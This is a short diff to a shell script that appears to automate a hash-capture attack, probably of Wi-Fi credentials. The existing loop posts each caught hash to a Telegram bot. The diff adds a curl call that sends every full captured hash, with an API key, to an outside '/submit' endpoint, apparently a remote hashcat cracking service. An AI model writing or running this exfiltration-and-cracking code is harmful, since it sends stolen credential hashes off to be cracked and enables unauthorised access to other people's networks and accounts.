@@ -2,6 +2,8 @@
 
 telegram_key="<ADD ME>"
 chat_id="<ADD ME>"
+url=""
+hashcat_key=""
 
 last_hash=""
 hashes=""
@@ -26,6 +28,7 @@ do
 				echo "HASH: $hash"
 				short=$(echo $hash | cut -d ":" -f 1-4)
 				curl -X POST -H 'Content-Type: application/json' -d "{\"chat_id\": \"$chat_id\", \"text\": \"Hash caught: $short :)\"}" https://api.telegram.org/bot$telegram_key/sendMessage
+                curl -X POST --data "key=$hashcat_key&hash=$hash" $url/submit &
 			fi
 		done
 	fi
